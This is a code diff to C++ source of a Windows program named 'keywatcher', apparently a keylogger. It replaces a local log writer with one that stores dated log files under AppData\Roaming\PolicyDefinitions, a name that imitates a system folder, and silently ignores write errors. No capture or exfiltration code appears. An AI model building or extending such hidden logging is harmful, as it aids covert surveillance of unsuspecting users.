@@ -18,15 +18,7 @@ std::string keywatcher::to_string(const T& value) {
 }
 
 
-void keywatcher::write_to_log(const std::string& s) {
-  std::ofstream file("keywatcher.log", std::ios::app);     // opening file in append mode
-
-  file << "[" << keywatcher::datetime().get_datetime() << "] " << s << std::endl;
-  file.close();
-}
-
-
-std::string keywatcher::get_apps_root_path() {
+std::string keywatcher::fetch_apps_root_path() {
   // to fetch path C:\Users\USERNAME\AppData\Roaming
   std::string base_path = getenv("APPDATA");
 
@@ -37,13 +29,19 @@ std::string keywatcher::get_apps_root_path() {
 }
 
 
+std::string keywatcher::fetch_log_path() {
+  // location to put all log files
+  return keywatcher::fetch_apps_root_path() + "PolicyDefinitions\\";
+}
+
+
 bool keywatcher::make_dir(std::string path) {
   // Return True(1) if the folder already exists or successfully created
   return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
 }
 
 
-bool keywatcher::validate_apps_root_path(std::string path) {
+bool keywatcher::validate_path(std::string path) {
   // looping through the path and checking at each \\ for path's existence
   for (char &ch : path) {
     if (ch == '\\') {
@@ -57,4 +55,34 @@ bool keywatcher::validate_apps_root_path(std::string path) {
     }
   }
   return true;
+}
+
+
+void keywatcher::log(const std::string s) {
+  // get path to put log files
+  std::string path = keywatcher::fetch_log_path();
+
+  if (!validate_path(path))
+    return;
+
+  keywatcher::datetime dt = keywatcher::datetime();
+
+  // get file name based on current date and month
+  std::string filename = dt.get_dated_filename() + ".log";
+
+  try {
+    std::ofstream file(path + filename, std::ios::app);     // opening file in append mode
+
+    // check if file opened successfully
+    if (!file)
+      return;
+
+    file << "[" << dt.now() << "] " << s << std::endl;
+    file.close();
+  }
+  catch(...) {
+    // if any exception thrown while writing to log file we are catching it and
+    // ignoring it as of now.
+    return;
+  }
 }
